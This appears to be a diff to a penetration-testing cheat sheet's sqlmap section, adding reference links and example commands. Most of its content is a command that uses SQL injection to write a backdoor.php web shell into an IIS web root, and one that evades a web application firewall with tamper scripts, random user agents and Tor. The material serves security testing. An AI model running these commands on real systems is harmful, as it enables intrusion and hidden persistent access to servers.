@@ -1151,12 +1151,22 @@ root@kali:$ redis-cli -h 127.0.0.1 save
 
 ### sqlmap
 
+* [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
+
+Write file:
+
 ```
-root@kali:$ sqlmap -r request.req --batch -p <PARAM_NAME> --os windows --dbms mysql --passwords --tor --tor-type=SOCKS5
-root@kali:$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
+$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
 ```
 
-* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
+Test WAF:
+
+```
+$ sqlmap.py -u 'https://127.0.0.1' --data='{"param":"*"}' -p 'param' -v3 --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 --batch
+```
+
+* [www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)
 
 
 
